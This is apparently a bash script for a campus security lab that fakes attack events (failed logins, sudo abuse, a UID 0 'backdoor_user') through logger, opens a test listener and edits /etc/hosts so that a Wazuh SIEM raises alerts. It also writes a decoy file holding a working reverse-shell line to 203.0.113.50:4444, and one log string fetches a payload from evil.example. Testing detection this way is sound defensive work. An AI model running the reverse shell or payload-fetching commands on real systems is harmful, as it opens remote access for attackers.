#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STATE_DIR="${ROOT_DIR}/.attack-lab"
PID_FILE="${STATE_DIR}/http_server.pid"
SAFE_DIR="/tmp/campus-attack-lab"

mkdir -p "${STATE_DIR}"

msg() {
  printf '[attack-lab] %s\n' "$*"
}

need_cmd() {
  command -v "$1" >/dev/null 2>&1 || {
    echo "Missing command: $1" >&2
    exit 1
  }
}

auth_attack() {
  need_cmd logger
  msg "Injecting failed login and su events"
  for i in $(seq 1 10); do
    logger -p auth.warning "Failed password for invalid user hacker${i} from 203.0.113.50 port $((4440+i)) ssh2"
  done
  logger -p auth.warning "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.50 user=root"
  for _ in $(seq 1 5); do
    logger -p auth.warning "su: FAILED su for root by unknown_user"
  done
  msg "Auth attack simulation sent"
}

privilege_attack() {
  need_cmd logger
  msg "Injecting sudo and user-management events"
  logger -p auth.info "sudo: student : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow"
  logger -p auth.warning "sudo: attacker : user NOT in sudoers ; TTY=pts/4 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"
  logger -p auth.warning "sudo: hacker : user NOT in sudoers ; TTY=pts/5 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://evil.example/payload"
  logger -p auth.info "useradd[9999]: new user: name=backdoor_user, UID=0, GID=0, home=/root, shell=/bin/bash"
  logger -p auth.info "usermod[9998]: change user 'nobody' password"
  msg "Privilege attack simulation sent"
}

port_open_attack() {
  need_cmd python3
  if [[ -f "${PID_FILE}" ]] && kill -0 "$(cat "${PID_FILE}")" 2>/dev/null; then
    msg "Port attack already running on PID $(cat "${PID_FILE}")"
    return
  fi
  msg "Opening temporary listener on port 9099"
  nohup python3 -m http.server 9099 >/dev/null 2>&1 &
  echo $! > "${PID_FILE}"
  msg "Port 9099 opened with PID $(cat "${PID_FILE}")"
}

port_close_attack() {
  if [[ -f "${PID_FILE}" ]] && kill -0 "$(cat "${PID_FILE}")" 2>/dev/null; then
    kill "$(cat "${PID_FILE}")"
    rm -f "${PID_FILE}"
    msg "Closed temporary listener"
  else
    msg "No temporary listener is running"
  fi
}

fim_safe_attack() {
  msg "Creating safe suspicious files under ${SAFE_DIR}"
  mkdir -p "${SAFE_DIR}/.hidden_dir"
  cat > "${SAFE_DIR}/.reverse_shell.sh" <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/203.0.113.50/4444 0>&1
EOF
  chmod +x "${SAFE_DIR}/.reverse_shell.sh"
  printf 'keylogger\n' > "${SAFE_DIR}/keylogger.bin"
  chmod +x "${SAFE_DIR}/keylogger.bin"
  printf 'crypto_miner\n' > "${SAFE_DIR}/.hidden_dir/miner.elf"
  chmod +x "${SAFE_DIR}/.hidden_dir/miner.elf"
  msg "Safe file-creation simulation complete"
  msg "Note: /tmp-based files may not trigger real FIM unless that path is monitored"
}

fim_real_attack() {
  msg "Triggering real FIM by modifying /etc/hosts (sudo may prompt)"
  sudo sh -c "printf '\n# campus-attack-test %s\n' \"$(date -Is)\" >> /etc/hosts"
  msg "Added a marker line to /etc/hosts"
}

cleanup_all() {
  msg "Cleaning up attack-lab artifacts"
  port_close_attack
  rm -rf "${SAFE_DIR}"
  if sudo -n true >/dev/null 2>&1; then
    sudo sed -i '/campus-attack-test/d' /etc/hosts || true
  else
    msg "If you used fim-real, remove the marker with:"
    msg "  sudo sed -i '/campus-attack-test/d' /etc/hosts"
  fi
  msg "Cleanup finished"
}

show_help() {
  cat <<'EOF'
Usage:
  bash attack_lab.sh auth
  bash attack_lab.sh privilege
  bash attack_lab.sh port-open
  bash attack_lab.sh port-close
  bash attack_lab.sh fim-safe
  bash attack_lab.sh fim-real
  bash attack_lab.sh all
  bash attack_lab.sh cleanup

What each command does:
  auth        Injects failed SSH/PAM/su log events via logger
  privilege   Injects sudo abuse and suspicious user-management events
  port-open   Starts a temporary listener on port 9099
  port-close  Stops the temporary listener
  fim-safe    Creates suspicious files under /tmp/campus-attack-lab
  fim-real    Modifies /etc/hosts to trigger real file-integrity monitoring
  all         Runs auth + privilege + port-open + fim-safe
  cleanup     Removes attack-lab artifacts and closes the temp listener

After running attacks:
  - Wait 60-120 seconds
  - Check Campus Dashboard -> SIEM
  - Or Wazuh Dashboard -> Security Events
  - Filter by agent.id=001 or agent.name=campus-host if needed
EOF
}

action="${1:-help}"
case "${action}" in
  auth) auth_attack ;;
  privilege) privilege_attack ;;
  port-open) port_open_attack ;;
  port-close) port_close_attack ;;
  fim-safe) fim_safe_attack ;;
  fim-real) fim_real_attack ;;
  all)
    auth_attack
    privilege_attack
    port_open_attack
    fim_safe_attack
    ;;
  cleanup) cleanup_all ;;
  help|--help|-h) show_help ;;
  *)
    echo "Unknown action: ${action}" >&2
    echo >&2
    show_help
    exit 1
    ;;
esac
